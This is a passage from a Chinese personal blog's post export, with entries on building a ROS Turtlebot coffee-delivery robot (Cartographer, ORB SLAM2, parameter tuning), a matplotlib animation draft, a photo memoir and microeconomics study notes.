<h2 id="0x06-Cartographer-Turltlebot-rplidar-move-base-实时建图-自动导航"><a href="#0x06-Cartographer-Turltlebot-rplidar-move-base-实时建图-自动导航" class="headerlink" title="0x06 Cartographer-Turltlebot + rplidar + move_base 实时建图 + 自动导航"></a>0x06 Cartographer-Turltlebot + rplidar + move_base 实时建图 + 自动导航</h2><p>之前师兄用的 Cartographer-ROS，搞得比较麻烦，Cartographer-Turltlebot 都封装好了，会更方便一些。直接运行这个launch文件就可以在 <code>rviz</code> 里面用<code>2d nav goal</code>导航了。其中，因为雷达不是安装在机器人的正中间，所以<code>rplidar_robot.launch</code>是在原来的<code>rplidar.launch</code>的基础上添加了一个tf；<code>yocs_velocity_smoother</code>是个平滑器（如果一个节点发布速度命令不能保证其平滑度，在节点和cmd_vel_mux之间增加这个平滑器）；<code>move_base</code>的那些参数是师兄遗留下来的，我还没看&gt;_&lt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;launch&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- rplidar --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;include file&#x3D;&quot;$(find rplidar_ros)&#x2F;launch&#x2F;rplidar_robot.launch&quot;&gt;</span><br><span class="line">  &lt;&#x2F;include&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- !rplidar --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- yocs_velocity_smoother --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;include file&#x3D;&quot;$(find yocs_velocity_smoother)&#x2F;launch&#x2F;velocity_smoother.launch&quot;&gt;</span><br><span class="line">    &lt;arg name&#x3D;&quot;config_file&quot;           value&#x3D;&quot;yocs_velocity_smoother_param.yaml&quot;&#x2F;&gt;</span><br><span class="line">    &lt;arg name&#x3D;&quot;nodelet_manager_name&quot;  value&#x3D;&quot;mobile_base_nodelet_manager&quot;&#x2F;&gt;</span><br><span class="line">    &lt;arg name&#x3D;&quot;raw_cmd_vel_topic&quot;     value&#x3D;&quot;cmd_vel&quot;&#x2F;&gt;</span><br><span class="line">    &lt;arg name&#x3D;&quot;smooth_cmd_vel_topic&quot;  value&#x3D;&quot;cmd_vel_mux&#x2F;input&#x2F;navi&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;include&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- !yocs_velocity_smoother --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;node pkg&#x3D;&quot;move_base&quot; type&#x3D;&quot;move_base&quot; respawn&#x3D;&quot;false&quot; name&#x3D;&quot;move_base&quot; output&#x3D;&quot;screen&quot;&gt;</span><br><span class="line">    &lt;rosparam file&#x3D;&quot;$(find ltrobot2dnav)&#x2F;costmap_common_params.yaml&quot; command&#x3D;&quot;load&quot; ns&#x3D;&quot;global_costmap&quot; &#x2F;&gt;</span><br><span class="line">    &lt;rosparam file&#x3D;&quot;$(find ltrobot2dnav)&#x2F;costmap_common_params.yaml&quot; command&#x3D;&quot;load&quot; ns&#x3D;&quot;local_costmap&quot; &#x2F;&gt;</span><br><span class="line">    &lt;rosparam file&#x3D;&quot;$(find ltrobot2dnav)&#x2F;local_costmap_params.yaml&quot; command&#x3D;&quot;load&quot; &#x2F;&gt;</span><br><span class="line">    &lt;rosparam file&#x3D;&quot;$(find ltrobot2dnav)&#x2F;global_costmap_params.yaml&quot; command&#x3D;&quot;load&quot; &#x2F;&gt;</span><br><span class="line">    &lt;rosparam file&#x3D;&quot;$(find ltrobot2dnav)&#x2F;base_local_planner_params.yaml&quot; command&#x3D;&quot;load&quot; &#x2F;&gt;</span><br><span class="line">    &lt;param name&#x3D;&quot;controller_frequency&quot;  type&#x3D;&quot;double&quot;   value&#x3D;&quot;3.0&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;node&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- cartographer turtlebot_lidar_2d.launch --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;include file&#x3D;&quot;$(find cartographer_turtlebot)&#x2F;launch&#x2F;turtlebot_lidar.launch&quot;&gt;</span><br><span class="line">    &lt;arg name&#x3D;&quot;configuration_basename&quot; value&#x3D;&quot;turtlebot_urg_lidar_2d.lua&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;include&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- !cartographer --&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;launch&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x07-其它"><a href="#0x07-其它" class="headerlink" title="0x07 其它"></a>0x07 其它</h2><p>整个机器人基本能正常使用了，没有加优化效果感觉也还不错。机器人在接近障碍的时候可能会原地转一圈（可能是不知道自己用的是雷达而不是双目摄像头吧&gt;_&lt;）。</p>
<blockquote>
<p>英语好的可以看这个很牛逼的教程《<a href="http://learn.turtlebot.com/">做一个送咖啡机器人</a>》</p>
</blockquote>
]]></content>
      <categories>
        <category>SLAM</category>
      </categories>
      <tags>
        <tag>Turtlebot</tag>
        <tag>ROS</tag>
        <tag>Cartographer</tag>
      </tags>
  </entry>
  <entry>
    <title>制作一个送咖啡机器人 -- ORB SLAM2</title>
    <url>/post/making-a-coffeebot-ORB_SLAM/</url>
    <content><![CDATA[<blockquote>
<p>几个月前在计算所用rplidar做过一个送咖啡机器人。可是运用到室外场景Lidar成本太高，于是转战视觉SLAM。<br>花了几天时间用gazebo仿真，跑通了ORB SLAM2框架。</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/orb_slam_simulation-loop.gif" title="解决闭环"></p>
<span id="more"></span>

<hr>
<p>解决闭环（上面那个gif图）：<br><video src="http://qiniu.s1nh.org/orb_slam_simulation-loop.mp4"   width="800" controls="controls"><br>Your browser does not support the video tag.<br></video></p>
<p>Localization mode（拖拽机器人到新位置，ORB SLAM可以实现定位）:<br><video src="http://qiniu.s1nh.org/orb_slam_simulation-localization.mp4"  width="800"  controls="controls"><br>Your browser does not support the video tag.<br></video></p>
<p>完整SLAM过程：<br><video src="http://qiniu.s1nh.org/orb_slam_simulation-0.mp4"   width="800" controls="controls"><br>Your browser does not support the video tag.<br></video></p>
<hr>
<h2 id="0x01-Quick-Start"><a href="#0x01-Quick-Start" class="headerlink" title="0x01 Quick Start"></a>0x01 Quick Start</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装 ROS</span><br><span class="line">sudo sh -c &#39;echo &quot;deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ros&#x2F;ubuntu $(lsb_release -sc) main&quot; &gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;ros-latest.list&#39;</span><br><span class="line">sudo apt-key adv --keyserver hkp:&#x2F;&#x2F;ha.pool.sks-keyservers.net:80 --recv-key 421C365BD9FF1F717815A3895523BAEEB01FA116</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ros-kinetic-desktop-full</span><br><span class="line">sudo rosdep init</span><br><span class="line">rosdep update</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 创建ROS工作空间</span><br><span class="line">mkdir -p ~&#x2F;catkin_ws&#x2F;src</span><br><span class="line">cd ~&#x2F;catkin_ws&#x2F;</span><br><span class="line">catkin_make</span><br><span class="line"></span><br><span class="line"># 安装turtlebot</span><br><span class="line">sudo apt-get install ros-kinetic-turtlebot-*</span><br><span class="line"></span><br><span class="line"># 使用ROS工作空间</span><br><span class="line">source ~&#x2F;catkin_ws&#x2F;devel&#x2F;setup.bash</span><br></pre></td></tr></table></figure>

<h2 id="0x02-运行demo"><a href="#0x02-运行demo" class="headerlink" title="0x02 运行demo"></a>0x02 运行demo</h2><ul>
<li>仿真(gazebo) <code>roslaunch turtlebot_gazebo turtlebot_world.launch</code></li>
<li>遥控 <code>roslaunch turtlebot_teleop keyboard_teleop.launch</code></li>
<li>查看摄像头 <code>rosrun image_view image_view image:=/camera/rgb/image_raw</code></li>
<li>ORB_SLAM <code>rosrun ORB_SLAM2 Mono /home/s1nh/Project/ORB_SLAM2/Vocabulary/ORBvoc.txt /home/s1nh/Workspace/turtlebot/cam_orb_slam.yaml</code></li>
</ul>
<h2 id="0x03-相机相关"><a href="#0x03-相机相关" class="headerlink" title="0x03 相机相关"></a>0x03 相机相关</h2><ul>
<li>标定 <code>rosrun camera_calibration cameracalibrator.py --size 8x6 --square 0.108 image:=/camera/image_raw camera:=/camera</code></li>
<li>相机位置 <code>/opt/ros/kinetic/share/turtlebot_description/urdf/turtlebot_properties.urdf.xacro</code></li>
<li>相机 fov <code>/opt/ros/kinetic/share/turtlebot_description/urdf/turtlebot_gazebo.urdf.xacro</code></li>
</ul>
<h2 id="参考教程："><a href="#参考教程：" class="headerlink" title="参考教程："></a>参考教程：</h2><p><code>http://wiki.ros.org/cn/ROS/Tutorials</code><br><code>https://www.ncnynl.com/archives/201609/799.html</code></p>
]]></content>
      <categories>
        <category>SLAM</category>
      </categories>
      <tags>
        <tag>Turtlebot</tag>
        <tag>ORB SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>新工作：制作一个送咖啡机器人——调参</title>
    <url>/post/making-a-coffeebot-fine-tune/</url>
    <content><![CDATA[<blockquote>
<p>调了一下午参数调到怀疑人生，最后发现是参数配置文件没有同步 - -<br>晚上遗留的一大堆Bug，第二天都自动消失了<br>肯定是有会写代码的海螺姑娘偷偷入侵了我的电脑 &gt;_&lt;</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_fine_tune_joke.jpg-QNthin"></p>
<span id="more"></span>

<p><a href="http://s1nh.com/post/making-a-coffeebot-1/">上一节</a>中，机器人已经勉强能跑起来了，现在的任务是通过<strong>调参</strong>让机器人越来越稳定、好用。引用<code>Cartographer Docs</code>的一句话 <em>Tuning Cartographer is unfortunately really difficult.</em> 不过折腾半天最后的效果还是挺不错的。</p>
<h2 id="0x01-Cartographer"><a href="#0x01-Cartographer" class="headerlink" title="0x01 Cartographer"></a>0x01 Cartographer</h2><h3 id="1-机器人被劫持了咋办"><a href="#1-机器人被劫持了咋办" class="headerlink" title="(1) 机器人被劫持了咋办"></a>(1) 机器人被劫持了咋办</h3><p>尝试过把机器人搬到另一个地方，Cartographer以为机器人还在原处，生成的地图就2B了。</p>
<blockquote>
<p>Cartographer中有一个文档中没有的函数<code>PerformGlobalLocalization()</code>，可以解决这个问题。《<a href="https://github.com/googlecartographer/cartographer_ros/issues/95">Localization in Existing Map</a>》和《<a href="https://github.com/googlecartographer/cartographer/issues/315">Support localization</a>》中有对它的讨论。</p>
</blockquote>
<p>其实看了上面两个帖子，并没有什么太大的卵用，因为我不会越过 <code>Cartographer_ROS Api</code> 直接调用Cartographer的函数。如果在构建地图的时候碰到这种被劫持的情况（特别是搬动到比较远的地方），地图基本就GG了；如果已经构建好整个区域的地图，使用<code>-map_filename</code>调用地图文件进行导航的时候，还是有可能解决的：</p>
<ul>
<li><code>TRAJECTORY_BUILDER.pure_localization = true</code> 减少了增长的SLAM数据，使内存使用降低到以前的1/10左右</li>
<li><code>SPARSE_POSE_GRAPH.optimize_every_n_scans = 1</code>进行全局校正的时间，每秒钟都会对自己的局部地图与全局地图进行匹配，如果位移不是很大，会看到地图被慢慢的矫正过去。（如果这个值设大了或者设为0，你的地图会乱成一坨屎也矫正不过去）</li>
</ul>
<p><img src="http://qiniu.s1nh.org/Blog_robot_fine_tune_move_map.gif" title="把机器人搬移一段位置，地图会自动矫正（map视图）"></p>
<p>虽然矫正后的map会有点乱，但submap还是很好看的。</p>
<p><img src="http://qiniu.s1nh.org/Blog_robot_fine_tune_move_submap.gif" title="自动矫正的submap视图"></p>
<p>所以<code>TRAJECTORY_BUILDER.pure_localization = true</code> <code>SPARSE_POSE_GRAPH.optimize_every_n_scans = 1</code> 这两个参数基本是在<strong>定位</strong>的时候成对出现的。而在<strong>建立地图</strong>的时候<code>TRAJECTORY_BUILDER.pure_localization</code>不能开启，并且<code>SPARSE_POSE_GRAPH.optimize_every_n_scans</code>最好设置大一点（200左右）。</p>
<p><strong>矫正失败的情况</strong></p>
<p>我把机器人搬到一个很相似的空间里，基本就失败了，控制机器人在屋里转来转去也没矫正成功。</p>
<p><img src="http://qiniu.s1nh.org/Blog_robot_fine_tune_move_unable.png-QNthin"></p>
<h3 id="2-为什么要使用cartographer-turtlebot，而不是直接用cartographer-ROS"><a href="#2-为什么要使用cartographer-turtlebot，而不是直接用cartographer-ROS" class="headerlink" title="(2) 为什么要使用cartographer_turtlebot，而不是直接用cartographer_ROS"></a>(2) 为什么要使用cartographer_turtlebot，而不是直接用cartographer_ROS</h3><p>除了多出几个turtlebot的配置文件省去你调参的麻烦以外，<code>cartographer_turtlebot</code>还多了<a href="https://github.com/googlecartographer/cartographer_turtlebot/blob/master/cartographer_turtlebot/cartographer_turtlebot/flat_world_imu_node_main.cc">flat_world_imu_node</a>这个函数，官方的解释是<code>&#39;imu_data_raw&#39; topic</code>传递的Kobuki的IMU信息因为驱动的问题会导致乱顺序，这个函数去掉了乱序的信息。</p>
<p>有个开关叫<code>TRAJECTORY_BUILDER_2D.use_imu_data</code>，如果不用imu的话，构图的时候一定要移动的很慢、很慢，使用了imu就可以让小车飞快的跑。在cartographer_turtlebot中能找到使用方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;node name&#x3D;&quot;flat_world_imu_node&quot; pkg&#x3D;&quot;cartographer_turtlebot&quot;</span><br><span class="line">    type&#x3D;&quot;cartographer_flat_world_imu_node&quot; output&#x3D;&quot;screen&quot;&gt;</span><br><span class="line">  &lt;remap from&#x3D;&quot;imu_in&quot; to&#x3D;&quot;&#x2F;mobile_base&#x2F;sensors&#x2F;imu_data_raw&quot; &#x2F;&gt;</span><br><span class="line">  &lt;remap from&#x3D;Navigation&quot;imu_out&quot; to&#x3D;&quot;&#x2F;imu&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;node&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-其它参数"><a href="#3-其它参数" class="headerlink" title="(3) 其它参数"></a>(3) 其它参数</h3><p><code>TRAJECTORY_BUILDER_2D.submaps.num_range_data</code> submap的大小</p>
<h2 id="0x02-Navigation"><a href="#0x02-Navigation" class="headerlink" title="0x02 Navigation"></a>0x02 Navigation</h2><blockquote>
<p>坑先仍这，下周继续调</p>
</blockquote>
<p>没接触过navigation的同鞋可以看这篇blog《<a href="http://blog.exbot.net/archives/1129">拿ROS navigation 玩自主导航攻略（1）——by 西工大一小学生</a>》写得很详细。</p>
]]></content>
      <categories>
        <category>SLAM</category>
      </categories>
      <tags>
        <tag>Turtlebot</tag>
        <tag>ROS</tag>
        <tag>Cartographer</tag>
        <tag>Navigation</tag>
      </tags>
  </entry>
  <entry>
    <title>「草稿」使用 mplot3d 绘制动态 3D 图</title>
    <url>/post/matplotlib-animation/</url>
    <content><![CDATA[<p><code>最近记性特别差，做的东西如果不记下来，过几天就忘光了。照这样发展下去马上就老年痴呆了，趁年轻还是多学点东西</code></p>
<p>最近正在学习一些大数据、机器学习的一些算法，脑子一热准备把<code>遗传算法</code>/<code>模拟退火算法</code>这些经典的算法用动图模拟出来。在《<a href="https://github.com/azheng333/BigDataML">白话大数据与机器学习</a>》中有实现遗传算法的代码，本文基于教程上的代码进行修改，实现模拟遗传算法求极值的过程。</p>
<span id="more"></span>

<p><del>题目是要通过遗传算法求解z=y sin(x) + x cos(y)在 [-10,10]内的极大值。想法是这样的，先绘制函数曲线，然后通过遗传算法进行计算，把每一步的计算结果依次显示在图像的坐标上，形成动画。（做了一半，感觉动图好像并不能形象的描绘出遗传算法）</del></p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>有了NumPy，基本可以放弃Matlab/Octave了。将Python相当于变成一种免费的更强大的MatLab系统。</p>
<p>“NumPy（Numeric Python）提供了许多高级的数值编程工具，如：矩阵数据类型、矢量处理，以及精密的运算库。专为进行严格的数字处理而产生。多为很多大型金融公司使用，以及核心的科学计算组织如：Lawrence Livermore，NASA用其处理一些本来使用C++，Fortran或Matlab等所做的任务。”</p>
<p><a href="http://old.sebug.net/paper/books/scipydoc/index.html">《用Python做科学计算》</a>是一本超级好的教材，包含了不仅仅以下内容： </p>
<ul>
<li>NumPy-快速处理数据</li>
<li>SciPy-数值计算库</li>
<li>SymPy-符号运算</li>
<li>matplotlib-绘制图表</li>
<li>Traits-为Python添加类型定义</li>
<li>TraitsUI-制作用户界面</li>
<li>Chaco-交互式图表</li>
<li>TVTK-三维可视化数据</li>
<li>Visual-制作3D演示动画</li>
<li>Mayavi-更方便的可视化</li>
</ul>
<h2 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h2><p>刚开始用了<a href="http://old.sebug.net/paper/books/scipydoc/mlab_and_mayavi.html">mayavi库</a>，画出来的图像很漂亮，不过apt源下载的是4.4.3版本（pip是4.4.4），总提示版本不对要我重新编译，最后折腾折腾就崩溃了。不用mayavi的另一个原因是，我不会把画的图统一到一个参考系里面，画的图忽大忽小的。最后选择了用<code>matplotlib</code>来重写。（改写的时候碰到一个坑：mayavi 用 <code>np.ogrid</code> 生成的X,Y向量；而matplotlib需要用  <code>np.mgrid</code> 生成X,Y矩阵。没有深究）</p>
<p>使用matplotlib绘制3D图很简单，按照 [ <a href="http://blog.csdn.net/ikerpeng/article/details/20523679?utm_source=tuicool&utm_medium=referral">教程1</a>，<a href="http://blog.csdn.net/jasonding1354/article/details/42125555?utm_source=tuicool&utm_medium=referral">教程2</a>，<a href="http://chuansong.me/n/1860572">教程3</a>，<a href="http://matplotlib.org/mpl_toolkits/mplot3d/tutorial.html">文档1</a> ] 很快就可以画出像样的图(如下图)，并且可以修改颜色和样式。（感觉比mayavi丑一点，并且移动视角的时候比mayavi卡）</p>
<p><img src="http://qiniu.s1nh.org/Blog_python-genetic_1.png-QNthin" alt="z=y sin(x)+x cos(y)" title="Z = Y sin(X) + X cos(Y)"></p>
<h2 id="给matplotlib制作动画"><a href="#给matplotlib制作动画" class="headerlink" title="给matplotlib制作动画"></a>给matplotlib制作动画</h2><p>对于我这种小白，matplotlib 也是个大坑。用<code>plt.show()</code>画完图以后，程序就卡那不动了，并不能通过计算一步步的显示动画。然后发现了<code>pyplot.ion()</code>这个方法，可以在类似ipython的交互式shell中显示图表 [ <a href="http://blog.sciencenet.cn/blog-1408284-850983.html">教程1</a> ] ，并且不会发生阻塞；可是采用非shell的方式并不能够显示图表&gt;_&lt;</p>
<p>这个问题纠结了好久，直到遇见这篇<a href="http://www.tuicool.com/articles/iMN7veq">讲解matplotlib画动态多图</a>的教程，然后找到了官方的<a href="http://matplotlib.org/examples/animation/simple_3danim.html">3D 动态图 example </a>和这个<a href="http://matplotlib.org/examples/animation/unchained.html">看起来很牛逼的 example </a>，还有这个《<a href="http://mytrix.me/2013/08/matplotlib-animation-tutorial/">MATPLOTLIB动画指南</a>》得知，我们需要调用<a href="http://matplotlib.org/api/animation_api.html?highlight=animation#matplotlib.animation.FuncAnimation">animation API</a>：</p>
<pre><code>class matplotlib.animation.FuncAnimation(fig, func, frames=None, init_func=None, fargs=None, save_count=None, **kwargs)

* func: 绘图函数。动画开始以后，会不断的重复调用这个函数来进行绘制。
* frames: 一共有多少帧。
* frags: 传递给func的参数
* blit: 什么鬼？
* interval: 绘制每一帧的时间(ms)
* repeat: 绘制完所有的frames后是否重绘，如果frames=None，那么即使repeat=True，也不会重绘。
* repeat_delay: 重绘之前延时多少ms
</code></pre>
<p><em>–未完待续–</em></p>
]]></content>
      <categories>
        <category>科学计算</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>科学计算</tag>
      </tags>
  </entry>
  <entry>
    <title>记念</title>
    <url>/post/memory/</url>
    <content><![CDATA[<blockquote>
<p>其实我们的表面是一幅天真纯洁的样子，内心却始终悖逆潜行。<br>像冰冷的机器，心中没有远方，也不会去追问未来<br>时光很快就会把我们从<strong>微弱的闪光体</strong>变成一个无能的普通人。<br>我们要做的只有觉悟而已，去追求自由，去向往风居住的街道。<br>就像穿越稠密的交集望透世界，就像沉没在镂空的意境里寻找奇迹。</p>
</blockquote>
<span id="more"></span>

<h3 id="第一桶金"><a href="#第一桶金" class="headerlink" title="第一桶金"></a>第一桶金</h3><p>08年的时候赚了Google一“大笔”钱，第一次见到支票长啥样。</p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_09.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_08.jpg-QNthin"></p>
<ul>
<li>当时可喜欢泡图书馆了，在书店和图书馆里看的都是这种书</li>
</ul>
<p><img src="http://qiniu.s1nh.org/Blog_memory_15.jpg-QNthin"></p>
<ul>
<li>和这种书。</li>
</ul>
<p><img src="http://qiniu.s1nh.org/Blog_memory_05.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_07.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_13.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_14.jpg-QNthin" title="当他们的西方同龄人沉迷于摇滚时，中国的青少年的热情被大人们引导到了这一类演出上面。很难讲哪一种更投入，只能说被愚弄的程度有差别"></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_10.jpg-QNthin" title="喜欢的Yngwie"></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_11.jpg-QNthin" title="第一次演出"></p>
<h3 id="虽然自己并不会拍照"><a href="#虽然自己并不会拍照" class="headerlink" title="虽然自己并不会拍照"></a>虽然自己并不会拍照</h3><p><img src="http://qiniu.s1nh.org/Blog_memory_12.jpg-QNthin" title="抢来了姥爷的相机"></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_31.jpg-QNthin" title="虽然自己并不会拍照"></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_03.jpg-QNthin" title="3年级加入的管乐队"><br><img src="http://qiniu.s1nh.org/Blog_memory_04.jpg-QNthin" title="第一把吉他"></p>
<h3 id="或许从某个时间开始，我就已经死了"><a href="#或许从某个时间开始，我就已经死了" class="headerlink" title="或许从某个时间开始，我就已经死了"></a>或许从某个时间开始，我就已经死了</h3><p><code>或许有些人追寻了一辈子自由，到头来却连自由是什么都还搞不清楚。还不如就这样一天一天，得过且过</code></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_16.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_memory_17.jpg-QNthin"></p>
<h3 id="本科"><a href="#本科" class="headerlink" title="本科"></a>本科</h3><p><img src="http://qiniu.s1nh.org/Blog_memory_18.jpg-QNthin" title="第一把琴，很便宜的卖给小熊了"><br><img src="http://qiniu.s1nh.org/Blog_memory_19.jpg-QNthin" title="第二把琴"></p>
<h3 id="暴走大事件"><a href="#暴走大事件" class="headerlink" title="暴走大事件"></a>暴走大事件</h3><p>大二做的游戏，我做的好像还是WindowsPhone版的。记得杨峻当时就跟我们说他梦想就是开一个游戏公司，我当时也还是个微软的脑残粉。</p>
<p><img src="http://qiniu.s1nh.org/Blog_baozou-01.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_baozou-02.jpg-QNthin"></p>
<h3 id="当上了会长，最风光的时候"><a href="#当上了会长，最风光的时候" class="headerlink" title="当上了会长，最风光的时候"></a>当上了会长，最风光的时候</h3><p><img src="http://qiniu.s1nh.org/Blog_memory_20.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_memory_21.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_memory_22.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_memory_23.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_memory_24.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_memory_29.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_memory_30.jpg-QNthin"></p>
<h3 id="杨峻开了一家公司"><a href="#杨峻开了一家公司" class="headerlink" title="杨峻开了一家公司"></a>杨峻开了一家公司</h3><p><img src="http://qiniu.s1nh.org/Blog_memory_25.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_memory_26.jpg-QNthin" title="第一杯咖啡"><br><img src="http://qiniu.s1nh.org/Blog_memory_27.jpg-QNthin" title="第一张名片"><br><img src="http://qiniu.s1nh.org/Blog_memory_28.jpg-QNthin" title="第一个工作台"></p>
<p><em>今天清理了一下电脑，买了两台云服务器和一个虚拟主机玩，把这个博客放到了虚拟主机上。清理电脑的时候翻出了很多照片，放这留念～</em></p>
<p><img src="http://qiniu.s1nh.org/Blog_memory_06.png"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>微观经济学--学习笔记</title>
    <url>/post/microeconomics-note/</url>
    <content><![CDATA[<blockquote>
<p>为什么计算机系的学生也应该学经济学？因为，从经营一家公司的角度来看，比起那些不懂的程序员，一个理解基本商业规则的程序员将会更有价值。就是这么简单。我无法告诉你有多少次我是那样地充满挫折感，因为我看到了太多提出一些疯狂的想法的程序员，这些想法在代码上也许可行，但在资本主义世界中毫无意义。如果你懂得商业规则，你就是一个更有价值的程序员，你会因此得到回报的，但是前提是你要去学习微观经济学。——《软件随想录》</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_1_0.png-QNthin"></p>
<span id="more"></span>

<blockquote>
<p>本文为<a href="http://open.163.com/special/Khan/microeconomics.html">可汗学院公开课：微观经济学</a>的学习笔记。原视频共70多集，每集十几分钟，强烈推荐所有人观看。</p>
</blockquote>
<hr>
<h3 id="生产可能性边界"><a href="#生产可能性边界" class="headerlink" title="生产可能性边界"></a>生产可能性边界</h3><p>一个靠打猎和采集植物为生的人，在考虑一天应该分别花多少时间来打猎和采集。我们把问题简化为对打<strong>兔子</strong>(Rabbits)和采<strong>浆果</strong>(Berries)之间的取舍。<br>假设一个人一天除了打猎啥都不干，可以打5只兔子；在<strong>其它条件不变</strong>(Ceteris Paribus)的情况下，如果只打4只兔子，那么就有时间采集100个浆果；打3只兔子则可以采180个浆果……以此类推，不花时间打兔子可以采集300个浆果。我们用 (A～F) 来表示上述情况，并记录在下图的表格中。</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_1_1.png-QNthin"></p>
<p>我们把上述六种情况画在坐标轴上，横轴为打兔子的数量，纵轴为采集浆果的数量。然后把这六个点用平滑的曲线连接起来。这条曲线叫做<strong>生产可能性边界</strong>（Productions Probabilities Frontier, PPF）</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_1_2.png-QNthin"></p>
<p><strong>生产可能性边界</strong>表示了可以同时得到兔子和浆果的组合。我们<strong>得不到</strong>(Impossible)在边界外侧的组合（比如我们无法一天同时获得5只兔子和200个浆果）；曲线内侧的点都是<strong>可以实现的</strong>(possible)，不过并不是最优的。</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_1_3.png-QNthin"></p>
<h3 id="机会成本"><a href="#机会成本" class="headerlink" title="机会成本"></a>机会成本</h3><p>假如我们现在处于E位置，也就是说每天打1只兔子、采摘280个浆果时。<br>如果想变为一天打2只兔子，那么就要放弃40个浆果，则：在E情况下，多打一只兔子的<strong>机会成本</strong>(Opportunity Cost)为40个浆果。</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_2_1.png-QNthin"></p>
<p>如果不想打兔子，改为打300个浆果，那么：在E情况下，多采摘20个浆果的<strong>机会成本</strong>为1只兔子。我们把左右两边同时除以20，多采摘1个浆果的<strong>边际成本</strong>(Marginal Cost, MC)为1/20。</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_2_0.png-QNthin"></p>
<h3 id="递增机会成本"><a href="#递增机会成本" class="headerlink" title="递增机会成本"></a>递增机会成本</h3><p>假设我们处于F位置，想多打1只兔子，将会放弃20只浆果（变成E位置）；当我们想再多打一只兔子（变成D位置）时，将要再放弃40只浆果……因此，每尝试多打一只兔子的时候，就要比之前放弃更多的浆果。这就是<strong>递增机会成本</strong>(Increasing Opportunity Cost)。在函数中，可以理解为随着横坐标的增加，曲线的负斜率越来越大。</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_3_1.png-QNthin"></p>
<h3 id="配置效率和边际效益"><a href="#配置效率和边际效益" class="headerlink" title="配置效率和边际效益"></a>配置效率和边际效益</h3><p>我们先画出边际成本的列表和图像，表中20/40/60/80/100分别为在F/E/D/C/B时增加一个兔子的<strong>边际成本</strong>(MC)</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_4_1.png-QNthin"></p>
<p><strong>边际效益</strong>(Marginal Benifit, MB)可以理解为，在某情形中愿意支付多少浆果来换取一只兔子。</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_1_1.png-QNthin"></p>
<p>我们回到之前的表格（如上图），当我们在F位置时，有300个浆果，0只兔子，那么我们就愿意花更多的浆果去换取一只兔子（假设为100个浆果）；当一天打1只兔子摘280个浆果（E位置）时，我们就只愿意用80个浆果来换取一只兔子；当处于D位置时，我们已经拥有了2只兔子，只有240个浆果，所以只愿意用60个浆果来换一只兔子……<br>以此类推，我们画出<strong>边际效益</strong>的表格和图像。下图的MC表示<strong>边际成本</strong>（<em>位于某位置时多打一只兔子要放弃的浆果数量</em>），MB表示<strong>边际效益</strong>（<em>某位置时换取一只兔子愿意付出的浆果数量</em>）</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_4_2.png-QNthin"></p>
<p>通过上图的函数曲线我们可以看出，D位置时的<strong>边际成本</strong>和<strong>边际效益</strong>是相同的。也就是说，在D位置时，多得到一只兔子所付出的成本跟愿意付出的成本是相等的。我们称之为实现了<strong>配置效率</strong>(Allocative Efficiency)</p>
